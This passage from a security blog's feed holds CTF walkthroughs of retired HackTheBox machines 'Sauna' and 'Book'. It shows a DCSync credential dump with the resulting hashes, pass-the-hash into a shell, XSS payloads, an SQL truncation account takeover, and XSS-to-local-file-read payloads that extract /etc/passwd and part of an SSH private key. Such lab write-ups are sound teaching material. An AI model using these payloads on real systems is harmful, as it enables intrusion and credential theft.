&lt;span class="code-line"&gt;CSV-Files/DACLs.csv:&amp;quot;EGOTISTICAL-BANK&amp;quot;,&amp;quot;Domain&amp;quot;,&amp;quot;All&amp;quot;,&amp;quot;All&amp;quot;,&amp;quot;ReadProperty, GenericExecute&amp;quot;,&amp;quot;Allow&amp;quot;,&amp;quot;EGOTISTICALBANK\svc_loanmgr&amp;quot;,&amp;quot;Administrators&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;00000000-0000-0000-0000-000000000000&amp;quot;,&amp;quot;00000000-0000-0000-0000-000000000000&amp;quot;,&amp;quot;EGOTISTICALBANK\svc_loanmgr&amp;quot;,&amp;quot;S-1-5-32-544&amp;quot;,&amp;quot;DC=EGOTISTICAL-BANK,DC=LOCAL&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;CSV-Files/DACLs.csv:&amp;quot;EGOTISTICAL-BANK&amp;quot;,&amp;quot;Domain&amp;quot;,&amp;quot;DS-Replication-Get-Changes&amp;quot;,&amp;quot;All&amp;quot;,&amp;quot;ExtendedRight&amp;quot;,&amp;quot;Allow&amp;quot;,&amp;quot;EGOTISTICALBANK\svc_loanmgr&amp;quot;,&amp;quot;Administrators&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;ObjectAceTypePresent&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2&amp;quot;,&amp;quot;00000000-0000-0000-0000-000000000000&amp;quot;,&amp;quot;EGOTISTICALBANK\svc_loanmgr&amp;quot;,&amp;quot;S-1-5-32-544&amp;quot;,&amp;quot;DC=EGOTISTICAL-BANK,DC=LOCAL&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;CSV-Files/DACLs.csv:&amp;quot;EGOTISTICAL-BANK&amp;quot;,&amp;quot;Domain&amp;quot;,&amp;quot;DS-Replication-Get-Changes-All&amp;quot;,&amp;quot;All&amp;quot;,&amp;quot;ExtendedRight&amp;quot;,&amp;quot;Allow&amp;quot;,&amp;quot;EGOTISTICALBANK\svc_loanmgr&amp;quot;,&amp;quot;Administrators&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;ObjectAceTypePresent&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2&amp;quot;,&amp;quot;00000000-0000-0000-0000-000000000000&amp;quot;,&amp;quot;EGOTISTICALBANK\svc_loanmgr&amp;quot;,&amp;quot;S-1-5-32-544&amp;quot;,&amp;quot;DC=EGOTISTICAL-BANK,DC=LOCAL&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;CSV-Files/GroupMembers.csv:&amp;quot;Domain Users&amp;quot;,&amp;quot;svc_loanmgr&amp;quot;,&amp;quot;L Manager&amp;quot;,&amp;quot;user&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;CSV-Files/GroupMembers.csv:&amp;quot;Remote Management Users&amp;quot;,&amp;quot;svc_loanmgr&amp;quot;,&amp;quot;L Manager&amp;quot;,&amp;quot;user&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;CSV-Files/Users.csv:&amp;quot;svc_loanmgr&amp;quot;,&amp;quot;L Manager&amp;quot;,&amp;quot;True&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;True&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;True&amp;quot;,&amp;quot;False&amp;quot;,,,,&amp;quot;False&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;0&amp;quot;,&amp;quot;25&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;False&amp;quot;,,,,,,&amp;quot;513&amp;quot;,&amp;quot;S-1-5-21-2966785786-3096785034-1186376766-1108&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;2/19/2020 3:39:15 PM&amp;quot;,&amp;quot;1/24/2020 3:48:31 PM&amp;quot;,,,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,,,,&amp;quot;66048&amp;quot;,&amp;quot;L&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;Manager&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;1/24/2020 3:48:31 PM&amp;quot;,&amp;quot;2/19/2020 3:39:15 PM&amp;quot;,&amp;quot;CN=L Manager,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL&amp;quot;,&amp;quot;EGOTISTICAL-BANK.LOCAL/Users/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="dcsync"&gt;DCSync&lt;/h2&gt;
&lt;p&gt;This extended privilege allow us to &lt;a href="https://adsecurity.org/?p=1729"&gt;run DCSync attack&lt;/a&gt;.
For that we use
&lt;a href="https://github.com/SecureAuthCorp/impacket/"&gt;impacket's secretdump.py&lt;/a&gt; to get
the users' passwords hashes and mostly the &lt;code&gt;administrator&lt;/code&gt;'s password hash.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python secretsdump.py &amp;#39;egotisticalbank.local/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Using the DRSUAPI method to get NTDS.DIT secrets&lt;/span&gt;
&lt;span class="code-line"&gt;Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::&lt;/span&gt;
&lt;span class="code-line"&gt;Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
&lt;span class="code-line"&gt;krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::&lt;/span&gt;
&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::&lt;/span&gt;
&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::&lt;/span&gt;
&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::&lt;/span&gt;
&lt;span class="code-line"&gt;SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7a2965077fddedf348d938e4fa20ea1b:::&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Kerberos keys grabbed&lt;/span&gt;
&lt;span class="code-line"&gt;Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031&lt;/span&gt;
&lt;span class="code-line"&gt;Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0&lt;/span&gt;
&lt;span class="code-line"&gt;Administrator:des-cbc-md5:19d5f15d689b1ce5&lt;/span&gt;
&lt;span class="code-line"&gt;krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24&lt;/span&gt;
&lt;span class="code-line"&gt;krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9&lt;/span&gt;
&lt;span class="code-line"&gt;krbtgt:des-cbc-md5:c170d5dc3edfc1d9&lt;/span&gt;
&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324&lt;/span&gt;
&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9&lt;/span&gt;
&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7&lt;/span&gt;
&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2&lt;/span&gt;
&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b&lt;/span&gt;
&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b&lt;/span&gt;
&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba&lt;/span&gt;
&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c&lt;/span&gt;
&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2&lt;/span&gt;
&lt;span class="code-line"&gt;SAUNA$:aes256-cts-hmac-sha1-96:a90968c91de5f77ac3b7d938bd760002373f71e14e1a027b2d93d1934d64754a&lt;/span&gt;
&lt;span class="code-line"&gt;SAUNA$:aes128-cts-hmac-sha1-96:0bf0c486c1262ab6cf46b16dc3b1b198&lt;/span&gt;
&lt;span class="code-line"&gt;SAUNA$:des-cbc-md5:b989ecc101ae4ca1&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Cleaning up...&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="pth"&gt;PTH&lt;/h2&gt;
&lt;p&gt;We can then use the &lt;a href="http://blog.gentilkiwi.com/tag/pass-the-hash"&gt;Path the hash&lt;/a&gt;
technique with
&lt;a href="https://github.com/SecureAuthCorp/impacket/"&gt;impacket's psexec.py&lt;/a&gt; to login as
Administrator on the Domain Controller as administrator and get the flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python psexec.py egotisticalbank.local/Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff&lt;/span&gt;
&lt;span class="code-line"&gt;Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Requesting shares on 10.10.10.175.....&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Found writable share ADMIN$&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Uploading file NEOSMAXA.exe&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Opening SVCManager on 10.10.10.175.....&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Creating service RFiq on 10.10.10.175.....&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Starting service RFiq.....&lt;/span&gt;
&lt;span class="code-line"&gt;[!] Press help for extra shell commands&lt;/span&gt;
&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.17763.973]&lt;/span&gt;
&lt;span class="code-line"&gt;(c) 2018 Microsoft Corporation. All rights reserved.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Windows\system32&amp;gt;type C:\Users\Administrator\Desktop\root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;f3ee04965c68257382e31502cc5e881f&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This box is a lot like &lt;a href="todo link if article already published"&gt;Forest&lt;/a&gt; and I
am a bit disappointed. Apart from that the box is interesting.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;What a journey. This box was classified as easy but probably needed a medium
classification. WinRM is so &lt;em&gt;finicky&lt;/em&gt;. The root part was interesting as it
allowed us to play with AD privileges which doesn't happen a lot
outside of client environments.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;(Conclustion of &lt;a href="https://maggick.fr/2020/03/htb-forest.html"&gt;Forest&lt;/a&gt;)&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Windows"></category><category term="impacket"></category><category term="enumeration"></category></entry><entry><title>HTB: Book</title><link href="https://maggick.fr/2020/07/htb-book.html" rel="alternate"></link><published>2020-07-12T16:30:00+02:00</published><updated>2020-07-12T16:30:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-07-12:/2020/07/htb-book.html</id><summary type="html">&lt;p&gt;&lt;img alt="Book card" class="align-left" src="/media/2020.07/book_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/230"&gt;Book&lt;/a&gt;
This box is classified as a medium machine published on February the 22th 2020
by &lt;a href="https://www.hackthebox.eu/home/users/profile/13531"&gt;MrR3boot&lt;/a&gt;.
It involves some XSS, an SQL truncation injection and a CVE on logrotate.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.07/book_card.png" alt="Book card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/230"&gt;Book&lt;/a&gt;
This box is classified as a medium machine published on February the 22th 2020
by &lt;a href="https://www.hackthebox.eu/home/users/profile/13531"&gt;MrR3boot&lt;/a&gt;.
It involves some XSS, an SQL truncation injection and a CVE on logrotate.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP) are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Tue Feb 25 07:26:24 2020 as: nmap --top-ports=10000 -sS -oN nmap 10.10.10.176&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.176&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.013s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 8318 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Tue Feb 25 07:31:10 2020 -- 1 IP address (1 host up) scanned in 286.11 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The landing web page is a simple sign up/ login form.&lt;/p&gt;
&lt;p&gt;&lt;img alt="authentication and signup forms" src="/media/2020.07/book_01.png"&gt;&lt;/p&gt;
&lt;p&gt;We can create an account on the box (there is no email verification).&lt;/p&gt;
&lt;p&gt;Once logged in we can browse the book collections, download them and learn
things about the flowers.&lt;/p&gt;
&lt;p&gt;&lt;img alt="User panel" src="/media/2020.07/book_02.png"&gt;&lt;/p&gt;
&lt;p&gt;We can also upload books by uploading a PDF file and providing the author name
and the book title. This two fields are vulnerable to XSS injection even using a
simple payload as &lt;code&gt;&amp;lt;img src="" onerror=alert(1)/&amp;gt;&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;To trigger the XSS we need to search for our book.&lt;/p&gt;
&lt;p&gt;&lt;img alt="admin panel" src="/media/2020.07/book_04.png"&gt;
&lt;img alt="admin panel" src="/media/2020.07/book_05.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Note: This need to be exploited quickly as the book collection is periodicaly
reset.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The Contact form give us the email address of the platform's administrator:
&lt;code&gt;admin@book.htb&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id="admin-panel"&gt;admin panel&lt;/h2&gt;
&lt;p&gt;When looking at the website pages we found &lt;code&gt;/admin/&lt;/code&gt; another login form.&lt;/p&gt;
&lt;p&gt;Using &lt;a href="https://resources.infosecinstitute.com/sql-truncation-attack"&gt;SQL truncation&lt;/a&gt;
we can change the admin account password on the plateform:&lt;/p&gt;
&lt;p&gt;We register a new user with a specific long email using Burp repeater.
Our post data request is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/index.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;10.10.10.176&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;en-US,en;q=0.5&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://10.10.10.176/index.php&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/x-www-form-urlencoded&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;222&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;PHPSESSID=9li0llrrcn7tthael9i5s8pmsr&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="na"&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;name=ppqqe&amp;amp;email=admin%40book.htb%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*&amp;amp;password=q&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can now logged in as &lt;code&gt;admin@book.htb&lt;/code&gt; using the password &lt;code&gt;q&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="admin panel" src="/media/2020.07/book_03.png"&gt;&lt;/p&gt;
&lt;p&gt;The admin panel allow to download the users' and books' collections.
As we saw previously the files &lt;code&gt;book title&lt;/code&gt; and &lt;code&gt;book author&lt;/code&gt; are vulnerable to
an XSS.&lt;/p&gt;
&lt;p&gt;It is possible to &lt;a href="https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html"&gt;transform an XSS in a generated PDF into an LFI&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We create a new book with our user account and put a specific JavaScript payload
in the &lt;code&gt;book title&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;script&amp;gt;&lt;/span&gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open(&amp;quot;GET&amp;quot;,&amp;quot;file:///etc/passwd&amp;quot;); x.send(); &lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we generate the collection PDF. It will include the whole &lt;code&gt;/etc/passwd&lt;/code&gt;
file. We see that the only system user is &lt;code&gt;reader&lt;/code&gt; (UID 1000).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;bin:x:2:2:bin:/bin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;sys:x:3:3:sys:/dev:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;sync:x:4:65534:sync:/bin:/bin/sync&lt;/span&gt;
&lt;span class="code-line"&gt;games:x:5:60:games:/usr/games:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;gnats:x:41:41:GnatsBug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;systemd-network:x:100:102:systemd NetworkManagement,,,:/run/systemd/netif:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;systemd-resolve:x:101:103:systemdResolver,,,:/run/systemd/resolve:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;syslog:x:102:106::/home/syslog:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;messagebus:x:103:107::/nonexistent:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;_apt:x:104:65534::/nonexistent:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;lxd:x:105:65534::/var/lib/lxd/:/bin/false&lt;/span&gt;
&lt;span class="code-line"&gt;uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;pollinate:x:109:1::/var/cache/pollinate:/bin/false&lt;/span&gt;
&lt;span class="code-line"&gt;sshd:x:110:65534::/run/sshd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;reader:x:1000:1000:reader:/home/reader:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We need to get a shell on the box and if possible a persistent access (like a
checkpoint) as a password or ssh private key. That's why we just try to get
&lt;code&gt;/home/reader/.ssh/id_rsa&lt;/code&gt; with the following payload:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;script&amp;gt;&lt;/span&gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open(&amp;quot;GET&amp;quot;,&amp;quot;file:///home/reader/.ssh/id_rsa&amp;quot;); x.send(); &lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we download the PDF file. It contains a SSH private key.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-----BEGIN RSA PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJG8m6UNZyRGj&lt;/span&gt;
&lt;span class="code-line"&gt;7eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0WxtCK0VlQUwxZ6953D16uxl&lt;/span&gt;
&lt;span class="code-line"&gt;RH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd&lt;/span&gt;
&lt;span class="code-line"&gt;/j3xWXHgpaJciHKxeNlr8x6NgbPv4s7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hL&lt;/span&gt;
&lt;span class="code-line"&gt;W1UGx/13fh20cZXA6PK75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7&lt;/span&gt;
&lt;span class="code-line"&gt;hihAbIi73mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+McK&lt;/span&gt;
&lt;span class="code-line"&gt;IrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUItIGcAaz3dTODgD&lt;/span&gt;
&lt;span class="code-line"&gt;O04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJjhPHFI7usIxmgX8Q2/nx3LSUN&lt;/span&gt;
&lt;span class="code-line"&gt;eZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lc&lt;/span&gt;
&lt;span class="code-line"&gt;PzvVGOEGQzkuu4ljFkYz6sZ8GMx6GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmT&lt;/span&gt;
&lt;span class="code-line"&gt;mk3A7jOwke0o8/4FLE2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPl&lt;/span&gt;
